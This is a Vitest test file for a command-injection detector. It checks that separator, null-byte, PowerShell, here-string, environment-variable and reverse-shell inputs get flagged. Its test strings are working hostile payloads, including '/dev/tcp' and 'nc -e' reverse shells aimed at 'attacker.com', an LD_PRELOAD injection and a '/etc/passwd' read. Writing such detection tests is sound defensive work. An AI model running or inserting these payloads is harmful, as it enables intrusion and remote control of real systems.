import { describe, expect, it } from 'vitest'
import {
    detectCmdInjection,
    detectPowerShellClassMethodInjection,
    detectShellScriptHereDocBypass,
    detectEnvVarInjection,
    detectReverseShellPattern,
} from './cmd-injection-evaluator.js'

describe('cmd-injection-evaluator', () => {
    it('detects command separator injection', () => {
        const detections = detectCmdInjection('username=alice;whoami')
        expect(detections.some((d) => d.type === 'separator')).toBe(true)
    })

    it('detects null-byte bypass in shell context', () => {
        const detections = detectCmdInjection('cat /etc/passwd%00;id')
        expect(detections.some((d) => d.separator === 'null-byte')).toBe(true)
    })

    it('does not flag benign text input', () => {
        const detections = detectCmdInjection('report_2026_q1_final.txt')
        expect(detections).toHaveLength(0)
    })

    it('detects PowerShell class method injection via type accelerator (System.Diagnostics.Process::Start)', () => {
        const input = "[System.Diagnostics.Process]::Start('cmd.exe')"
        expect(detectPowerShellClassMethodInjection(input)).not.toBeNull()
        expect(detectPowerShellClassMethodInjection(input)!.separator).toBe('powershell_type_accelerator')
        expect(detectPowerShellClassMethodInjection(input)!.confidence).toBe(0.92)
        const detections = detectCmdInjection(input)
        expect(detections.some((d) => d.separator === 'powershell_type_accelerator')).toBe(true)
    })

    it('detects PowerShell class method injection via Runtime.InteropServices.Marshal::GetDelegateForFunctionPointer', () => {
        const input = '[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, $t)'
        expect(detectPowerShellClassMethodInjection(input)).not.toBeNull()
        const detections = detectCmdInjection(input)
        expect(detections.some((d) => d.separator === 'powershell_type_accelerator')).toBe(true)
    })

    it('detects shell here-string bypass (<<<) and echo|bash', () => {
        expect(detectShellScriptHereDocBypass("cmd <<< 'id'")).not.toBeNull()
        expect(detectShellScriptHereDocBypass("echo 'id' | bash")).not.toBeNull()
        const detections = detectCmdInjection("bash <<< 'whoami'")
        expect(detections.some((d) => d.separator === 'herestring_bypass' || d.type === 'heredoc')).toBe(true)
    })

    it('detects environment variable injection (LD_PRELOAD, BASH_FUNC_)', () => {
        expect(detectEnvVarInjection('LD_PRELOAD=/tmp/evil.so')).not.toBeNull()
        expect(detectEnvVarInjection('BASH_FUNC_complete%%=() { id; }')).not.toBeNull()
        expect(detectEnvVarInjection('GLIBC_TUNABLES=glibc.malloc.check=3')).not.toBeNull()
        const detections = detectCmdInjection('LD_PRELOAD=/tmp/evil.so ./app')
        expect(detections.some((d) => d.separator === 'env_injection')).toBe(true)
    })

    it('detects reverse shell patterns (/dev/tcp and nc -e)', () => {
        expect(detectReverseShellPattern('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')).not.toBeNull()
        expect(detectReverseShellPattern('nc -e /bin/bash 10.0.0.1 4444')).not.toBeNull()
        const detections = detectCmdInjection('bash -i >& /dev/tcp/attacker.com/443 0>&1')
        expect(detections.some((d) => d.separator === 'reverse_shell')).toBe(true)
    })
})
